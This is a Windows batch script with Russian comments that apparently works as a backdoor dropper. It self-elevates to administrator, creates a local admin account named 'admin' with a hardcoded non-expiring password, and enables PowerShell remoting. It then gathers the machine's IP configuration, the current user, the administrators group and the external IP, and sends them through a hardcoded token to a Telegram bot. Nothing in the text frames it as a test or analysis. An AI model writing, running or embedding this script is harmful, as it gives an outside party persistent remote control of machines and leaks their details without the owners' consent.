@echo off

chcp 65001
setlocal enabledelayedexpansion

if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
 
chcp 65001
net user /add admin D9SUC1@#$7gghj
net localgroup Администраторы admin /add
net localgroup Пользователи admin /del
wmic useraccount where "name='admin'" set passwordexpires=false


:: Получаем IP компьютера
for /f "skip=4 delims=" %%A in ('ipconfig /all') do (
    set "ip=!ip!%%A, "
)

:: Получаем пользователя, от имени которого выполнили скрипт.
for /f "delims=" %%A in ('whoami') do (
    set "user=!user!%%A, "
)

:: Получаем пользователей в группе "Администраторы"
for /f "skip=4 delims=" %%A in ('net localgroup "Администраторы"') do (
    set "adminUsers=!adminUsers!%%A, "
)


:: Выполнение команды PowerShell Enable-PSRemoting
powershell -Command "Enable-PSRemoting -Force"

:: Проверка успешности выполнения
if %errorlevel% equ 0 (
    set "WinRM=PSRemoting успешно включен."
) else (
    set "WinRM=Ошибка при включении PSRemoting."
)

:: Получаем внешний IP с помощью curl и записываем в переменную
for /f "tokens=*" %%a in ('curl -s http://ifconfig.me') do set "externalIP=%%a"

set "extip=    Внешний IP: !externalIP!"

set msg=!ip!!user!!adminUsers!!WinRM!!extip!
call :myFunction
endlocal
exit /b

:myFunction
set TOKEN="5845038021:AAHLrIG7mtU6NrfqthV1wyIyniojUoGRPx8"
set CHAT_ID="-1001881306503"

curl -X POST "https://api.telegram.org/bot!TOKEN!/sendMessage" -d "chat_id=!CHAT_ID!&text=!msg!"

